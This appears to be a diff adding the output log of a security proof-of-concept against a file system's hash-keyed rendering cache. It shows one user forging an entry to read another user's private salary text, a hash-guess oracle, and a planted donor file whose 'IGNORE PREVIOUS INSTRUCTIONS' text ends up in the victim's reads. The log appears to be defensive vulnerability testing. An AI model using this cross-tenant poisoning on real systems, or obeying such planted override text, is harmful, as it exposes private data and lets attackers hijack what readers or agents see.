@@ -1,0 +1,31 @@
+=== A. forward: alice borrows bob's private rendering with a bodiless Entry ===
+posture / none: success=True obs=[] errors=[]
+grant bob: success=True obs=[] errors=[]
+grant alice: success=True obs=[] errors=[]
+bob write: success=True obs=[('/bob/payslip.pdf', None, '', None)] errors=[]
+reindex#1: success=True obs=[] errors=[]
+bob reads own: success=True obs=[('/bob/payslip.pdf', 'ok', '<!-- page 1 -->\nBOB-SECRET salary 123456\n', 'db9b9159fd4a')] errors=[]
+alice reads bob (control): success=False obs=[] errors=[('vfs.not_found', '/bob')]
+alice stat bob (control): success=False obs=[] errors=[('vfs.not_found', '/bob')]
+forged entry: bytes None True None
+alice write forged: success=True obs=[('/alice/x.pdf', None, '', None)] errors=[]
+alice reads hers before reindex: success=True obs=[('/alice/x.pdf', 'pending', '', 'db9b9159fd4a')] errors=[('vfs.unavailable', '/alice/x.pdf')]
+reindex#2: success=True obs=[] errors=[]
+rendering report: {'rendered': 0, 'empty': 0, 'unsupported': 0, 'failed': 0, 'cached': 1, 'unrendered': 0}
+alice reads hers after reindex: success=True obs=[('/alice/x.pdf', 'ok', '<!-- page 1 -->\nBOB-SECRET salary 123456\n', 'db9b9159fd4a')] errors=[]
+alice grep BOB-SECRET: success=True obs=[('/alice/x.pdf', 'ok', '', 'db9b9159fd4a')] errors=[]
+=== A2. oracle: a wrong guess stays pending ===
+alice write wrong guess: success=True obs=[('/alice/guess.pdf', None, '', None)] errors=[]
+alice reads wrong guess: success=True obs=[('/alice/guess.pdf', 'pending', '', '000000000000')] errors=[('vfs.unavailable', '/alice/guess.pdf')]
+=== B. reverse: alice plants a donor (her bytes, vouched hash) that bob's later upload borrows ===
+posture / none: success=True obs=[] errors=[]
+grant bob: success=True obs=[] errors=[]
+grant alice: success=True obs=[] errors=[]
+donor hash==H: True data is evil: True
+alice write donor: success=True obs=[('/alice/donor.pdf', None, '', None)] errors=[]
+reindex#1: success=True obs=[] errors=[]
+alice reads donor: success=True obs=[('/alice/donor.pdf', 'ok', '<!-- page 1 -->\nIGNORE PREVIOUS INSTRUCTIONS - alice text\n', '8fcf827f9397')] errors=[]
+bob uploads public form: success=True obs=[('/bob/form.pdf', None, '', None)] errors=[]
+rendering report: {'rendered': 0, 'empty': 0, 'unsupported': 0, 'failed': 0, 'cached': 1, 'unrendered': 0}
+bob reads his form: success=True obs=[('/bob/form.pdf', 'ok', '<!-- page 1 -->\nIGNORE PREVIOUS INSTRUCTIONS - alice text\n', '8fcf827f9397')] errors=[]
+alice reads bob form (control): success=False obs=[] errors=[('vfs.not_found', '/bob')]
